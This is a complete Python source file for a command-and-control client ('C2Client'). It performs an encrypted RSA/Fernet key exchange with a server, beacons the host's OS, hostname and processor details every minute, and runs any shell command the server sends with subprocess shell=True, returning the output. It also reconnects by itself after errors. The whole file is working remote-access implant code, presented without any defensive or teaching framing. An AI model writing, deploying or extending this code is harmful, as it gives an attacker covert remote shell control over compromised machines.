import socket
import json
import threading
import time
import subprocess
import platform
import logging
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes, hmac
from cryptography.hazmat.primitives.asymmetric import padding
import os

class C2Client:
    def __init__(self, server_host='127.0.0.1', server_port=5000):
        self.server_host = server_host
        self.server_port = server_port
        self.symmetric_key = None
        self.hmac_key = None
        self.cipher_suite = None
        self.socket = None
        self.receive_thread = None
        self.status_thread = None
        self.stop_event = threading.Event()
        
        logging.basicConfig(
            level=logging.DEBUG,
            format='%(asctime)s - %(levelname)s: %(message)s',
            handlers=[
                logging.StreamHandler(),
                logging.FileHandler('logs/c2_client.log')
            ]
        )
        self.logger = logging.getLogger('C2Client')
    
    def connect_to_server(self):
        self.stop_event.clear()
        
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(30)
            self.socket.connect((self.server_host, self.server_port))
            self.logger.info("Connected to server")
            
            server_ready = self.socket.recv(1024)
            if server_ready != b'READY_FOR_KEY_EXCHANGE':
                raise ValueError("Server not ready for key exchange")
            
            self.socket.sendall(b'CLIENT_READY')
            
            server_public_key_pem = self.socket.recv(2048)
            server_public_key = serialization.load_pem_public_key(server_public_key_pem)
            
            self.symmetric_key = Fernet.generate_key()
            self.cipher_suite = Fernet(self.symmetric_key)
            self.hmac_key = os.urandom(32)
            
            encrypted_symmetric_key = server_public_key.encrypt(
                self.symmetric_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            encrypted_hmac_key = server_public_key.encrypt(
                self.hmac_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            
            self.socket.sendall(f"{len(encrypted_symmetric_key):010d}".encode())
            self.socket.sendall(f"{len(encrypted_hmac_key):010d}".encode())
            self.socket.sendall(encrypted_symmetric_key)
            self.socket.sendall(encrypted_hmac_key)
            
            exchange_result = self.socket.recv(1024)
            if exchange_result != b'KEY_EXCHANGE_COMPLETE':
                raise ValueError("Key exchange failed")
            
            self.logger.info("Successful key exchange")
            
            self.receive_thread = threading.Thread(
                target=self.receive_commands, 
                daemon=True
            )
            self.receive_thread.start()
            
            self.status_thread = threading.Thread(
                target=self.send_system_status, 
                daemon=True
            )
            self.status_thread.start()
        
        except Exception as e:
            self.logger.error(f"Connection error: {e}")
            self.cleanup()
    
    def send_system_status(self):
        while not self.stop_event.is_set():
            try:
                status = {
                    'type': 'system_status',
                    'timestamp': time.time(),
                    'system_info': self.get_system_info()
                }
                self.send_response(status)
                self.stop_event.wait(60)
            except Exception as e:
                self.logger.error(f"System status error: {e}")
                time.sleep(5)
    
    def send_response(self, response):
        try:
            if not self.socket:
                raise RuntimeError("No active socket connection")
            
            encrypted_response = self.cipher_suite.encrypt(
                json.dumps(response).encode()
            )
            h = hmac.HMAC(self.hmac_key, hashes.SHA256())
            h.update(encrypted_response)
            response_hmac = h.finalize()
            
            data_length = len(encrypted_response).to_bytes(4, 'big')
            self.socket.sendall(data_length)
            self.socket.sendall(encrypted_response)
            self.socket.sendall(response_hmac)
        
        except Exception as e:
            self.logger.error(f"Failed to send response: {e}")
            self.cleanup()
            self.connect_to_server()
    
    def receive_commands(self):
        while not self.stop_event.is_set():
            try:
                length_bytes = self.socket.recv(4)
                if len(length_bytes) != 4:
                    break
                data_length = int.from_bytes(length_bytes, 'big')
                
                encrypted_data = b''
                while len(encrypted_data) < data_length:
                    chunk = self.socket.recv(data_length - len(encrypted_data))
                    if not chunk:
                        break
                    encrypted_data += chunk
                
                if len(encrypted_data) != data_length:
                    break
                
                encrypted_hmac = self.socket.recv(32)
                if len(encrypted_hmac) != 32:
                    break
                
                h = hmac.HMAC(self.hmac_key, hashes.SHA256())
                h.update(encrypted_data)
                try:
                    h.verify(encrypted_hmac)
                except Exception:
                    continue
                
                data = self.cipher_suite.decrypt(encrypted_data).decode()
                command = json.loads(data)
                self.process_command(command)
            
            except Exception as e:
                self.logger.error(f"Error receiving command: {e}")
                break
        
        self.cleanup()
        self.connect_to_server()
    
    def cleanup(self):
        self.stop_event.set()
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None
    
    def process_command(self, command):
        try:
            command_type = command.get('type')
            
            if command_type == 'heartbeat':
                # Just log it if you want to track heartbeats
                self.logger.debug("Heartbeat received from server")
                return
            
            if command_type == 'shell':
                result = subprocess.run(
                    command['cmd'], 
                    shell=True, 
                    capture_output=True, 
                    text=True
                )
                response = {
                    'type': 'shell_result',
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'returncode': result.returncode
                }
                self.send_response(response)
            
            elif command_type == 'system_info':
                self.send_response(self.get_system_info())
            
            else:
                self.logger.warning(f"Unknown command type: {command_type}")
        
        except Exception as e:
            self.logger.error(f"Command processing error: {e}")
    
    def get_system_info(self):
        return {
            'os': platform.system(),
            'release': platform.release(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'hostname': platform.node()
        }

def main():
    client = C2Client()
    client.connect_to_server()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        client.cleanup()

if __name__ == '__main__':
    main()